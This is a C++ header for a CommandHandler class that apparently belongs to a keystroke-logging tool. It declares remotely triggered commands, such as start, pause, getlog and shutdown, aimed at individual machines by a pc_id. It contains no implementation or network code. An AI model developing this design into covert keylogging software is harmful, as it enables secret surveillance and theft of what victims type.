#pragma once

#include <functional>
#include <string>

#include "domain/common/Result.hpp"
#include "domain/services/IKeystrokeService.hpp"
#include "domain/services/IReportingService.hpp"
#include "application/interfaces/IReporter.hpp"

namespace nuub::application::commands {

class CommandHandler {
    domain::services::IKeystrokeService& keystrokes_;
    domain::services::IReportingService& reporting_;
    interfaces::IReporter& reporter_;
    std::string pc_id_;
    std::function<void()> on_shutdown_;

    [[nodiscard]] bool matches_target(const std::string& target) const;

public:
    CommandHandler(
        domain::services::IKeystrokeService& keystrokes,
        domain::services::IReportingService& reporting,
        interfaces::IReporter& reporter,
        std::string pc_id,
        std::function<void()> on_shutdown = nullptr);

    domain::Result<void> handle_start(const std::string& target);
    domain::Result<void> handle_status(const std::string& target);
    domain::Result<void> handle_pause(const std::string& target);
    domain::Result<void> handle_resume(const std::string& target);
    domain::Result<void> handle_getlog(const std::string& target);
    domain::Result<void> handle_shutdown(const std::string& target);
    domain::Result<void> handle_info(const std::string& target);
};

} // namespace nuub::application::commands
